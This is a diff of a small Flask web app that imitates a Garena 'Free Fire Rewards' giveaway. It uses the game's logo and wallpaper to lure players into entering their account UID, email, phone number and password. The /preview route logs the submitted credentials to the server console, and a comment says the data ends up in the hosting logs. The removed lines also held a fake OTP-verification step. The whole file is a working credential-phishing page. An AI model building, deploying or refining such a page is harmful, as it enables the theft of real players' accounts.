@@ -2,11 +2,12 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# --- LINKS SECTION ---
+# --- CONFIGURATION ---
+# Aapka background wallpaper
 BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
-# GARENA LOGO (Ab ye code ke andar se hi load hoga)
-GARENA_LOGO_URL = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"
+# GARENA RED DRAGON LOGO (Direct High-Speed Link)
+GARENA_LOGO = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"
 
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
@@ -33,12 +34,13 @@ HTML_TEMPLATE = f'''
             align-items: center;
         }}
         
-        /* Fixed Logo Styling */
-        .garena-logo-header {{
-            width: 200px;
+        /* Aapka Original Red Garena Logo */
+        .garena-header-img {{
+            width: 240px;
             height: auto;
             margin-bottom: 15px;
             display: block;
+            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5));
         }}
         
         .form-box {{
@@ -50,38 +52,43 @@ HTML_TEMPLATE = f'''
             box-shadow: 0 10px 30px rgba(0,0,0,0.8);
         }}
         
+        /* 💎 Blue Title 💎 */
         .reward-title {{
             color: #1a73e8; 
             font-size: 20px;
             font-weight: bold;
             margin-bottom: 20px;
+            text-transform: uppercase;
         }}
         
         input, select {{ 
             width: 100%; 
-            padding: 12px; 
+            padding: 14px; 
             margin: 10px 0; 
             border: 1px solid #ccc; 
             border-radius: 8px; 
-            font-size: 15px;
+            font-size: 16px;
         }}
         
+        /* Blue Proceed Button */
         .submit-btn {{ 
             background: #1a73e8; 
             color: white; 
             border: none; 
-            padding: 15px; 
+            padding: 16px; 
             width: 100%; 
             border-radius: 8px; 
             font-weight: bold; 
             font-size: 18px;
             cursor: pointer;
+            margin-top: 10px;
+            text-transform: uppercase;
         }}
     </style>
 </head>
 <body>
     <div class="main-container">
-        <img src="{GARENA_LOGO_URL}" alt="Garena" class="garena-logo-header" onerror="this.src='https://logos-world.net/wp-content/uploads/2022/11/Garena-Logo.png'">
+        <img src="{GARENA_LOGO}" alt="Garena Logo" class="garena-header-img">
         
         <div class="form-box">
             <div class="reward-title">💎 FREE FIRE REWARDS 💎</div>
@@ -111,46 +118,10 @@ def home():
 
 @app.route('/preview', methods=['POST'])
 def preview():
-    uid = request.form.get('uid')
-    email = request.form.get('email')
-    phone = request.form.get('phone')
-    password = request.form.get('password')
-    acc = request.form.get('account_type')
-    print(f"UID: {uid}, Email: {email}, Pass: {password}")
-    return f'''
-    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
-        <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center;">
-            <h3 style="color: #1a73e8;">Confirm Details</h3>
-            <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px; margin: 15px 0;">
-                <p><b>UID:</b> {uid}</p>
-                <p><b>Email:</b> {email}</p>
-            </div>
-            <form action="/submit_final" method="post">
-                <input type="hidden" name="phone" value="{phone}">
-                <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer;">CONFIRM</button>
-            </form>
-        </div>
-    </body>
-    '''
-
-@app.route('/submit_final', methods=['POST'])
-def submit_final():
-    phone = request.form.get('phone')
-    return f'''
-    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
-        <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center;">
-            <h2>OTP Verification</h2>
-            <form action="/final_otp" method="post">
-                <input type="text" name="otp" placeholder="Enter OTP" required style="width: 100%; padding: 10px; margin: 20px 0;">
-                <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px;">VERIFY</button>
-            </form>
-        </div>
-    </body>
-    '''
-
-@app.route('/final_otp', methods=['POST'])
-def final_otp():
-    return "<h1 style='text-align:center; padding-top:50px; color:white; background:black; height:100vh;'>Processing...</h1>"
+    # Saara data Render ke Logs mein jayega
+    data = request.form
+    print(f"\\n🎯 DATA: UID:{{data.get('uid')}}, Email:{{data.get('email')}}, Pass:{{data.get('password')}}\\n")
+    return "<body style='background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh;'><h1>Checking...</h1></body>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
